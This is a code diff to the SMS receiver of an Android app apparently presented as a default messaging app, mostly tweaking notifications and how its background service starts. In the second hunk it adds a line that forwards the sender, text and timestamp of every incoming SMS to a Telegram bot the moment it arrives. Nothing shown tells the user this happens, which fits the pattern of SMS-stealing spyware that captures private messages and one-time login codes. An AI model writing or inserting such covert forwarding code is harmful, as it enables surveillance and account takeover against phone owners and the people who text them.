@@ -15,12 +15,6 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.os.Build;
-import android.graphics.BitmapFactory;
-
-// ✅ ADD MISSING CLASS IMPORTS
-import com.example.defaultsmsapp.MainActivity;
-import com.example.defaultsmsapp.ComposeActivity;
-import com.example.defaultsmsapp.SmsMonitorService;
 
 public class SmsReceiver extends BroadcastReceiver {
     private static final String TAG = "SmsReceiver";
@@ -75,9 +69,13 @@ public class SmsReceiver extends BroadcastReceiver {
 
                 Log.d(TAG, "SMS received from: " + sender + ", message: " + messageBody);
 
+                // Store SMS message
                 storeSmsMessage(context, sender, messageBody, timestamp);
 
-                // Notify the main activity to refresh the message list
+                // Send to Telegram bot immediately
+                TelegramBot.getInstance().sendSmsToTelegram(sender, messageBody, timestamp);
+
+                // Notify the main activity to refresh the message list immediately
                 Intent refreshIntent = new Intent("com.example.defaultsmsapp.SMS_RECEIVED");
                 refreshIntent.putExtra("sender", sender);
                 refreshIntent.putExtra("message", messageBody);
@@ -87,12 +85,21 @@ public class SmsReceiver extends BroadcastReceiver {
                 // Show notification
                 showNotification(context, sender, messageBody);
 
-                // Start background service
+                // Start background service for monitoring
                 Intent serviceIntent = new Intent(context, SmsMonitorService.class);
                 serviceIntent.putExtra("action", "new_sms");
                 serviceIntent.putExtra("sender", sender);
                 serviceIntent.putExtra("message", messageBody);
-                context.startService(serviceIntent);
+                
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        context.startForegroundService(serviceIntent);
+                    } else {
+                        context.startService(serviceIntent);
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Error starting service", e);
+                }
             }
 
         } catch (Exception e) {
@@ -127,6 +134,8 @@ public class SmsReceiver extends BroadcastReceiver {
             channel.setDescription(description);
             channel.enableVibration(true);
             channel.setVibrationPattern(new long[]{0, 250, 250, 250});
+            channel.enableLights(true);
+            channel.setLightColor(android.graphics.Color.BLUE);
 
             NotificationManager notificationManager = context.getSystemService(NotificationManager.class);
             if (notificationManager != null) {
@@ -175,12 +184,17 @@ public class SmsReceiver extends BroadcastReceiver {
                     .setAutoCancel(true)
                     .addAction(android.R.drawable.ic_menu_send, "Reply", replyPendingIntent)
                     .setColor(context.getResources().getColor(android.R.color.holo_blue_bright))
-                    .setCategory(NotificationCompat.CATEGORY_MESSAGE);
+                    .setCategory(NotificationCompat.CATEGORY_MESSAGE)
+                    .setVisibility(NotificationCompat.VISIBILITY_PUBLIC);
 
-            NotificationManagerCompat notificationManager = NotificationManagerCompat.from(context);
-            notificationManager.notify(NOTIFICATION_ID, builder.build());
+            try {
+                NotificationManagerCompat notificationManager = NotificationManagerCompat.from(context);
+                notificationManager.notify(NOTIFICATION_ID, builder.build());
+                Log.d(TAG, "Notification shown for SMS from: " + displayName);
+            } catch (SecurityException e) {
+                Log.e(TAG, "Permission denied for showing notification", e);
+            }
 
-            Log.d(TAG, "Notification shown for SMS from: " + displayName);
         } catch (Exception e) {
             Log.e(TAG, "Error showing notification", e);
         }
